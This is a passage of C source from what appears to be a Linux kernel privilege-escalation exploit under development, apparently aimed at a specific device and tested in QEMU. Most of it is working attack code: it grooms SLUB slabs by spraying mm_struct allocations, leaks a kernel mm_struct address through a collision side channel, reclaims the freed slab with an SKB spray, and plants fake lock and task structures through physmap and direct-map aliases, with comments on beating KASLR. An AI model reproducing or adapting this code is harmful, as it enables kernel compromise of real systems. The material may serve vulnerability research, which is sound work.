            snprintf(sample[shown], sizeof(sample[0]), "%016llx",
                     (unsigned long long)strtoull(a + 4, NULL, 16));
            shown++;
          }
        }
      }
    }
    if (!nl) {
      break;
    }
    p = nl + 1;
  }
  pr_success("ledger %s: free_pages total=%d order2=%d leaked_pfn=0x%lx pages=%s %s %s %s\n",
             tag, total, order2, pfn, sample[0], sample[1], sample[2], sample[3]);
  free(buf);
#else
  (void)tag;
  (void)leaked;
#endif
}

/* §103.4: the payload page is double-mapped (user VA + direct-map alias), so the
   bytes the kernel will see can be read straight from userspace.  Used to test
   the lock/rb_leftmost consistency right before the slide round. */
uint64_t payload_page_word(uint32_t off) {
  if (!skb_buf || off + 8 > SKB_SEND_SIZE) {
    return 0;
  }
  return get64((const unsigned char *)skb_buf, off);
}

/* §109 safe probe oracle.  The staged write is
     target = candidate_alias + 0x20,  value = candidate_alias + 0x40
   so a *successful* round leaves the self-referential pointer `value` at
   user-visible offset 0x20 of whichever page the kernel wrote into.  Because the
   spray is double-mapped, we can verify that entirely from userspace - no delta,
   no kernel read, and the landing is always a writable RAM page (the candidate
   pool is the Normal zone, which never overlaps the kernel image mapping). */
int physmap_find_self(uintptr_t want_val, uint32_t off, size_t *out_page) {  if (!pmap_buf || !want_val) {
    return 0;
  }
  for (size_t o = 0; o + off + 8 <= pmap_len; o += PAGE_SIZE) {
    uint64_t v = 0;
    memcpy(&v, (const char *)pmap_buf + o + off, 8);
    if ((uintptr_t)v == want_val) {
      if (out_page) {
        *out_page = o >> 12;
      }
      return 1;
    }
  }
  return 0;
}

/* §109: expose the spray base so the probe can report which user page matched. */
void *pmap_buf_addr(void) { return pmap_buf; }
size_t pmap_buf_len(void) { return pmap_len; }

static uintptr_t prepare_kernel_page(int payload_mode) {
  close_reclaim_sockets();
  cleanup_page_prepare_state();
  /* v8.2 grooming fix: pin BEFORE any clone_memfd, so the children inherit the
     affinity and their mm_struct allocations come from the SAME CPU's slab.
     Otherwise the ctx mms scatter across per-CPU slabs and the leaked slab is
     never fully ours (=> never becomes empty/reclaimable). */
  pin_to_core(CORE);
  mm_objs_per_slab = MM_SLAB_SIZE / MM_STRUCT_SZ;
  report_slab_usage("baseline");
  if (g_zero_lock) {
    /* §113.5/§113.10: no payload page, no spray, no repair.  The overlay supplies
       word0/2 (target/value) and word8 (prio); word7 (lock) is a pristine zero
       slot of empty_zero_page (empty tree -> the walk's dedicated NULL branch)
       and word6 (waiter->task) is the page head: ~0x898 bytes of pure zeros
       (pi_lock/pi_waiters all zero) that never cross the page boundary. */
    fake_lock = zerolock_slot(0);
    fake_w0 = ZERO_LOCK_ALIAS;
    fake_task = ZERO_WORD6_ALIAS;
    fake_cred = 0;
    page_base = 0;
    /* STATS §113.21 pinning: the seq now reads __per_cpu_offset[0] with shape 1
       (the erase's second store lands on the padding BEFORE the array), so the
       old "must run on the highest online CPU" invariant (§70) is gone.  The
       device cpuset only grants cpu 0 anyway, so pin there and force the
       migration with sched_yield (sched_setaffinity only changes the mask).
       Pinning is best-effort: the read-index no longer depends on it. */
    {
      cpu_set_t want, got;
      CPU_ZERO(&want);
      CPU_SET(0, &want);
      errno = 0;
      int rc = sched_setaffinity(0, sizeof(want), &want);
      int e = errno;
      CPU_ZERO(&got);
      sched_getaffinity(0, sizeof(got), &got);
      int first = -1, cnt = 0;
      for (int i = 0; i < CPU_SETSIZE; i++) {
        if (CPU_ISSET(i, &got)) {
          if (first < 0) {
            first = i;
          }
          cnt++;
        }
      }
      printf("ZEROLOCK pin: want=0 rc=%d errno=%d cpu=%d allowed_count=%d "
             "first_allowed=%d\n",
             rc, e, sched_getcpu(), cnt, first);
      fflush(stdout);
    }
    pin_to_core(0);
    sched_yield();
    usleep(20000);
    sched_yield();
    printf("ZEROLOCK fake_lock=%016zx fake_w0=%016zx fake_task(word6)=%016zx "
           "cpu=%d\n",
           (size_t)fake_lock, (size_t)fake_w0, (size_t)fake_task,
           sched_getcpu());
    fflush(stdout);
    return ZERO_LOCK_ALIAS;
  }
  if (g_physmap) {
    /* §102: no grooming, no pagemap on device - pick a physical address, build
       the payload in page 0 of the spray and replicate it to every page. */
    physmap_layout_select();
    if (!physmap_setup()) {
      return 0;
    }
    skb_buf = pmap_buf;
    skb_buf_is_mmap = 1;
    dmap_base = pmap_alias;
    if (!prepare_skb_payload(pmap_alias, payload_mode)) {
      pr_warning("physmap payload build failed\n");
      return 0;
    }
    physmap_replicate();
    page_base = pmap_alias;
    printf("PHYSMAP payload base=%016zx fake_lock=%016zx fake_w0=%016zx fake_task=%016zx\n",
           (size_t)pmap_alias, (size_t)fake_lock, (size_t)fake_w0,
           (size_t)fake_task);
    fflush(stdout);
    return pmap_alias;
  }
#ifndef ZF9_DEVICE
  if (!g_force_groom) {
    /* v10 (2): bypass the SKB/buddy grooming entirely.  Put the fake
       structures into a page-aligned user buffer and use that page's
       DIRECT-MAP alias (PO + pfn<<12) as fake_lock - a kernel address whose
       KASLR-independent value we control.  PFN via /proc/self/pagemap (root).
       v19: the page is set up once and reused by every primitive; only the
       structures inside it are rebuilt per call. */
    if (!dmap_page && !dmap_page_setup()) {
      pr_warning("dmap page setup failed; falling back to SKB grooming\n");
    } else {
      /* g_no_restore is an EXPERIMENT: after the first build, hand the page
         back exactly as the previous primitive left it (no repair). */
      int skip = g_no_restore && dmap_built;
      skb_buf = dmap_page;      /* prepare_skb_payload writes through skb_buf */
      skb_buf_is_mmap = 1;      /* shared mapping: cleanup must not free() it */
      if (skip || prepare_skb_payload(dmap_base, payload_mode)) {
        dmap_built = 1;
        printf("%s base=%016zx fake_lock=%016zx fake_w0=%016zx fake_task=%016zx\n",
               skip ? "DMAP NORESTORE reuse" : "DMAP borrow",
               (size_t)dmap_base, (size_t)fake_lock, (size_t)fake_w0,
               (size_t)fake_task);
        fflush(stdout);
        return dmap_base;
      }
      pr_warning("dmap payload build failed; falling back to SKB grooming\n");
    }
  }
#endif
  prepare_ctxs();

  skb_buf = malloc(SKB_SEND_SIZE);
  skb_buf_is_mmap = 0;
  if (!skb_buf) {
    pr_error("skb payload allocation failed\n");
  }

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.memfds[i] = clone_memfd();
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.memfds[i] = clone_memfd();
  }
  /* §58 drain phase: hold a large batch (pinned to the same CPU) so every
     partially-used slab is consumed, then wait until the cache is all-full. */
  for (size_t i = 0; i < drain_ctx.mm_cnt; i++) {
    drain_ctx.memfds[i] = clone_memfd();
  }
  pr_success("live children after-spawn: %d (drain_cnt=%zu)\n",
             count_live_children(), drain_ctx.mm_cnt);
  report_slab_usage("after-prepare+spray+drain-spawn");
  wait_for_mm_slabs_full();
  ledger_probe_enable("kcp", 0);

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 1, 0);

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.memfds[i] = clone_memfd();
  }
  pid_t leak_child = clone_leak_child();
  g_leak_pid = leak_child;
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.memfds[i] = clone_memfd();
  }
#ifndef ZF9_DEVICE
  {
    size_t op = 0, os = 0, opre = 0, opost = 0;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) if (prepare_ctx.memfds[i] >= 0) op++;
    for (size_t i = 0; i < spray_ctx.mm_cnt; i++) if (spray_ctx.memfds[i] >= 0) os++;
    for (size_t i = 0; i < pre_ctx.mm_cnt; i++) if (pre_ctx.memfds[i] >= 0) opre++;
    for (size_t i = 0; i < post_ctx.mm_cnt; i++) if (post_ctx.memfds[i] >= 0) opost++;
    printf("CTXKIDS held: prepare=%zu/%zu spray=%zu/%zu pre=%zu/%zu post=%zu/%zu\n",
           op, prepare_ctx.mm_cnt, os, spray_ctx.mm_cnt, opre, pre_ctx.mm_cnt,
           opost, post_ctx.mm_cnt);
    fflush(stdout);
  }
#endif
#ifndef ZF9_DEVICE
  printf("LEAKCHILD=%d\n", (int)leak_child);
  fflush(stdout);
  /* the child stays alive; wait for its find_collisions to publish the state */
  while (ks->state != KERNELSNITCH_COLLISIONS_FOUND &&
         ks->state != KERNELSNITCH_COLLISIONS_NOT_FOUND) {
    usleep(10000);
  }
#else
  SYSCHK(waitpid(leak_child, NULL, 0));
#endif

  if (!kernelsnitch_found_collisions(ks)) {
    kernelsnitch_cleanup(ks);
    ks = NULL;
    kill_child(leak_child);
    cleanup_page_prepare_state();
    return 0;
  }

  kernelsnitch_bruteforce(ks);
  report_slab_usage("after-KS");
  uintptr_t leaked = ks->mm_struct;
#ifndef ZF9_DEVICE
  printf("LEAKMYPID=%d\n", (int)getpid());
  printf("LEAKED=%016zx\n", (size_t)leaked);
  printf("LEAKOFF=%zx\n", (size_t)(leaked - P0_PAGE_OFFSET));
  printf("LEAKSLAB=%016zx\n", (size_t)(leaked & ~(uintptr_t)(MM_SLAB_SIZE - 1)));
  fflush(stdout);
#endif
  if (leaked == (uintptr_t)-1 || leaked < RAM_MAP_BASE || leaked >= RAM_MAP_END) {
    pr_warning("kernel page leak rejected: %016zx\n", leaked);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    kill_child(leak_child);
    cleanup_page_prepare_state();
    return 0;
  }

  uintptr_t base = leaked & ~(MM_SLAB_SIZE - 1);
  uintptr_t slab_off = leaked - base;
  size_t leaked_slot = slab_off / MM_STRUCT_SZ;
  if (slab_off % MM_STRUCT_SZ != 0 || leaked_slot >= mm_objs_per_slab ||
      !prepare_skb_payload(base, payload_mode)) {
    kernelsnitch_cleanup(ks);
    ks = NULL;
    kill_child(leak_child);
    cleanup_page_prepare_state();
    return 0;
  }
  /* §58: the sprayed payload must be the §82 unified (neutral) shape - the same
     one the seq engine drives - since the device cannot repair it. */
  payload_neutralize();
#ifndef ZF9_DEVICE
  printf("LEAKSLOT=%zu/%zu objs_per_slab=%zu\n", leaked_slot,
         mm_objs_per_slab, mm_objs_per_slab);
  fflush(stdout);
#endif
  trace_watch_page_free(leaked);
  ledger_dump_allocs("ks-window", leaked);
  mm_slab_ledger_arm(leaked);

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
  int sndbuf = 1 << 20;
  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
  int flags = fcntl(reclaim_sv[0], F_GETFL, 0);
  if (flags >= 0) {
    fcntl(reclaim_sv[0], F_SETFL, flags | O_NONBLOCK);
  }

  int shaping_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, shaping_sv));
  struct iovec iov = {
    .iov_base = skb_buf,
    .iov_len = SKB_RECLAIM_SIZE,
  };
  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;
  if (sendmsg(shaping_sv[0], &msg, 0) != (ssize_t)SKB_RECLAIM_SIZE) {
    close(shaping_sv[0]);
    close(shaping_sv[1]);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    kill_child(leak_child);
    close_reclaim_sockets();
    cleanup_page_prepare_state();
    return 0;
  }

  pin_to_core(CORE);
  for (int i = 0; i < 4; i++) {
    sched_yield();
  }
  /* v8.1 grooming fix: free ALL held mm_structs (not just a few) so the
     mm_cachep node partial list exceeds min_partial(=5) and empty slabs are
     handed back to the buddy, where the SKB spray can reclaim them (incl. the
     leaked slab). The payload was already built (prepare_skb_payload above). */
  /* §101 order: flood FIRST so nr_partial is already past min_partial when the
     leaked slab empties - then it is discarded the moment it goes empty. */
  close_ctx_memfds(&drain_ctx);
  close_ctx_memfds(&prepare_ctx);
  close_ctx_memfds(&spray_ctx);
  close_ctx_memfds(&post_ctx);
  ledger_free_window_begin();
  close_ctx_memfds(&pre_ctx);   /* the leaked child's slab-mates -> its slab empties last */
  close(shaping_sv[0]);
  close(shaping_sv[1]);
  for (int i = 0; i < 8; i++) {
    sched_yield();
  }
  kill_child(leak_child);
  /* §101 tail flush: >= cpu_partial(13) slabs of alloc+free.  The allocations
     reuse the retained leaked slab off the partial list; freeing them empties it
     while nr_partial is high, which is when SLUB discards it. */
  slub_tail_flush(16);
  force_slab_release();
  for (int i = 0; i < 8; i++) {
    sched_yield();
  }
  report_slab_usage("after-release");
  ledger_dump_mmdrops("after-release", leaked);
  for (int i = 0; i < 8; i++) {
    usleep(500000);
    ledger_dump_mmdrops("poll", leaked);
  }
  mm_slab_ledger_dump("after-release", leaked);
  ledger_dump_order2("after-flood", leaked);
  rotation_dance();
  report_slab_usage("after-rotation");
  mm_slab_ledger_dump("after-rotation", leaked);
  flush_lazy_tlb_active_mm();
  report_slab_usage("after-lazytlb-flush");
  pr_success("live children after-release: %d\n", count_live_children());
  list_all_procs("after-release");
  dump_self_fds("after-release");
  gate_spray_on_page_free(leaked);
  report_slab_usage("after-gate");

  int reclaim_ok = 1;
  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
    if (sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT) !=
        (ssize_t)SKB_RECLAIM_SIZE) {
      reclaim_ok = 0;
      break;
    }
  }

#ifndef ZF9_DEVICE
  if (reclaim_ok) {
    printf("PAGEBASE=%016zx\n", (size_t)base);
    fflush(stdout);
  }
#endif

  kernelsnitch_cleanup(ks);
  ks = NULL;
  close_ctx_memfds(&prepare_ctx);
  if (!reclaim_ok) {
    close_reclaim_sockets();
    cleanup_page_prepare_state();
    return 0;
  }
#ifndef ZF9_DEVICE
  if (g_probe_stop) {
    printf("PROBE_STOP (after grooming frees+spray, before pselect/consume)\n");
    fflush(stdout);
    _exit(0);
  }
#endif
  return base;
}

uintptr_t prepare_good_kernel_page(int payload_mode) {
  int max_attempts = payload_mode == PAGE_PAYLOAD_SLIDE ?
      SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS : FOPS_KERNEL_PAGE_SETUP_ATTEMPTS;
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    uintptr_t base = prepare_kernel_page(payload_mode);
    if (base) {
      return base;
    }
    pr_warning("kernel page retry %d/%d mode=%d\n",
               attempt, max_attempts, payload_mode);
  }
  return 0;
}

int is_kernel_ptr(uintptr_t value) {
  return value >= 0xffff800000000000ULL;
}

int is_direct_ptr(uintptr_t value) {
  return value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END;
}

/* ---- QEMU-harness only: read /proc/kcore (guest is root) to verify where the
 * sprayed payload landed. Not used on the real device. ---- */
#ifndef ZF9_DEVICE
#include <elf.h>
#define POC_MAGIC 0x4d41474943000001ULL
static uint64_t kcore_find_magic(uint64_t start, uint64_t end) {
  int fd = open("/proc/kcore", O_RDONLY);
  if (fd < 0) return 0;
  Elf64_Ehdr eh;
  if (pread(fd, &eh, sizeof(eh), 0) != (ssize_t)sizeof(eh) ||
      memcmp(eh.e_ident, ELFMAG, 4) != 0) {
    close(fd);
    return 0;
  }
  size_t phsz = (size_t)eh.e_phnum * sizeof(Elf64_Phdr);
  Elf64_Phdr *ph = malloc(phsz);
  if (!ph || pread(fd, ph, phsz, eh.e_phoff) != (ssize_t)phsz) {
    free(ph);
    close(fd);
    return 0;
  }
  size_t chunk = 1 << 20;
  unsigned char *buf = malloc(chunk);
  uint64_t found = 0;
  for (int i = 0; i < eh.e_phnum && !found && buf; i++) {
    if (ph[i].p_type != PT_LOAD) continue;
    uint64_t s = ph[i].p_vaddr, e = s + ph[i].p_memsz;
    if (e <= start || s >= end) continue;
    uint64_t a = start > s ? start : s;
    uint64_t b = end < e ? end : e;
    for (uint64_t p = a; p + 8 <= b && !found; ) {
      uint64_t n = b - p;
      if (n > chunk) n = chunk;
      ssize_t r = pread(fd, buf, n, ph[i].p_offset + (p - s));
      if (r <= 0) break;
      for (ssize_t k = 0; k + 8 <= r; k += 8) {
        uint64_t v;
        memcpy(&v, buf + k, 8);
        if (v == POC_MAGIC) {
          found = p + (uint64_t)k;
          break;
        }
      }
      p += r;
    }
  }
  free(buf);
  free(ph);
  close(fd);
  return found;
}
#endif

